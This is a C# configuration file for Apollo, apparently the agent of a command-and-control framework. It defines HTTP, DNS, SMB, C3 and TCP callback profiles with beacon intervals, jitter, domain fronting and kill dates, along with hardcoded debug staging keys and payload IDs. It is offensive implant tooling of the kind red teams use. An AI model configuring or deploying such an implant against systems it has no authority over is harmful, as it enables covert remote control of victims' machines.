#define C2PROFILE_NAME_UPPER

#if DEBUG
//#define HTTP
#define DNS
//#define C3
#endif

#if HTTP
using HttpTransport;
#endif
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Structs.ApolloStructs;
using PSKCryptography;
using ApolloInterop.Serializers;
#if DNS
using DnsTransport;
#endif
#if SMB
using NamedPipeTransport;
#endif
#if C3
using C3Transport;
#endif
#if TCP
using TcpTransport;
#endif
namespace Apollo
{
    public static class Config
    {
        public static Dictionary<string, C2ProfileData> EgressProfiles = new Dictionary<string, C2ProfileData>()
        {
#if HTTP
            { "http", new C2ProfileData()
                {
                    TC2Profile = typeof(HttpProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if DEBUG
                        { "callback_interval", "5" },
                        { "callback_jitter", "0" },
                        //{ "callback_port", "443" },
                        //{ "callback_host", "https://34.41.225.176" },
                        { "callback_port", "80" },
                        { "callback_host", "http://127.0.0.1" },
                        { "post_uri", "data" },
                        { "encrypted_exchange_check", "T" },
                        { "proxy_host", "" },
                        { "proxy_port", "" },
                        { "proxy_user", "" },
                        { "proxy_pass", "" },
                        { "domain_front", "domain_front" },
                        { "killdate", "-1" },
                        { "USER_AGENT", "Apollo-Refactor" },
#else
                        { "callback_interval", "callback_interval_here" },
                        { "callback_jitter", "callback_jitter_here" },
                        { "callback_port", "callback_port_here" },
                        { "callback_host", "callback_host_here" },
                        { "post_uri", "post_uri_here" },
                        { "encrypted_exchange_check", "encrypted_exchange_check_here" },
                        { "proxy_host", "proxy_host_here" },
                        { "proxy_port", "proxy_port_here" },
                        { "proxy_user", "proxy_user_here" },
                        { "proxy_pass", "proxy_pass_here" },
                        { "killdate", "killdate_here" },
                        HTTP_ADDITIONAL_HEADERS_HERE
#endif
                    }
                }
            },
#endif
#if DNS
            { "dns", new C2ProfileData()
                {
                    TC2Profile = typeof(DnsProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if DEBUG
                        { "callback_interval", "5" },
                        { "callback_jitter", "0" },
                        { "callback_domains", "domain1.com" },
                        { "encrypted_exchange_check", "T" },
                        { "domain_front", "domain_front" },
                        { "msginit", "init" },
                        { "msgdefault", "default" },
                        { "hmac_key", "hmac secret key" },
                        { "killdate", "-1" },
#else
                        { "callback_interval", "callback_interval_here" },
                        { "callback_jitter", "callback_jitter_here" },
                        { "callback_domains", "callback_domains_here" },
                        { "encrypted_exchange_check", "encrypted_exchange_check_here" },
                        { "domain_front", "domain_front_here" },
                        { "msginit", "msginit_here" },
                        { "msgdefault", "msgdefault_here" },
                        { "hmac_key", "hmac_key_here" },
                        { "killdate", "killdate_here" },
#endif
                    }
                }
            },
#endif
#if SMB
            { "smb", new C2ProfileData()
                {
                    TC2Profile = typeof(NamedPipeProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if DEBUG
                        { "pipename", "ahatojqq-bo0w-oc3r-wqtg-4jf7voepqqbs" },
                        { "encrypted_exchange_check", "T" },
#else
                        { "pipename", "pipename_here" },
                        { "encrypted_exchange_check", "encrypted_exchange_check_here" },
#endif
                    }
                }
            },
#endif
#if C3
            { "c3", new C2ProfileData()
                {
                    TC2Profile = typeof(C3Profile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if DEBUG
                        //{ "pipename", "ahatojqq-bo0w-oc3r-wqtg-4jf7voepqqbs" },
                        { "pipename", "testdbg" },
                        { "callback_interval", "40" },
                        { "callback_jitter", "0" },
                        { "encrypted_exchange_check", "T" },
#else
                        { "pipename", "pipename_here" },
                        { "callback_interval", "callback_interval_here" },
                        { "callback_jitter", "callback_jitter_here" },
                        { "encrypted_exchange_check", "encrypted_exchange_check_here" },
#endif
                    }
                }
            },
#endif
#if TCP
            { "tcp", new C2ProfileData()
                {
                    TC2Profile = typeof(TcpProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if DEBUG
                        { "port", "40000" },
                        { "encrypted_exchange_check", "T" },
#else
                        { "port", "port_here" },
                        { "encrypted_exchange_check", "encrypted_exchange_check_here" },
#endif
                    }
                }
            }
#endif
        };


        public static Dictionary<string, C2ProfileData> IngressProfiles = new Dictionary<string, C2ProfileData>();
#if DEBUG
#if HTTP
        //public static string StagingRSAPrivateKey = "CFhesRs6+7q04B5fCmG0tKNjU9yExDwn+LMIDVONN/s=";
        public static string StagingRSAPrivateKey = "2tsm5J4zxPQhmaYQkfZBL+xkxGMxfHwwfLIUvdz+/8M=";
#elif DNS
        public static string StagingRSAPrivateKey = "2tsm5J4zxPQhmaYQkfZBL+xkxGMxfHwwfLIUvdz+/8M=";
#elif SMB
        public static string StagingRSAPrivateKey = "cnaJ2eDg1LVrR5LK/u6PkXuBjZxCnksWjy0vEFWsHIU=";
#elif C3
        public static string StagingRSAPrivateKey = "3GXt0pgLByfL+d18EdgR3Miv2809Ta17noIql8w+dVc=";
#elif TCP
        public static string StagingRSAPrivateKey = "LbFpMoimB+aLx1pq0IqXJ1MQ4KIiGdp0LWju5jUhZRg=";
#endif
#if HTTP
        //public static string PayloadUUID = "df52c064-75c0-4861-b4b8-e3782cf30740";
        public static string PayloadUUID = "6b7c114f-3661-4e89-974f-65b0c1264043";
#elif DNS
        public static string PayloadUUID = "6b7c114f-3661-4e89-974f-65b0c1264043";
#elif SMB
        public static string PayloadUUID = "869c4909-30eb-4a90-99b2-874dae07a0a8";
#elif C3
        public static string PayloadUUID = "f30f6fba-5a16-4dc3-af4c-7ae6c500090a";
#elif TCP
        public static string PayloadUUID = "a51253f6-7885-4fea-9109-154ecc54060d";
#endif
#else
        public static string StagingRSAPrivateKey = "AESPSK_here";
        public static string PayloadUUID = "payload_uuid_here";
#endif
    }
}
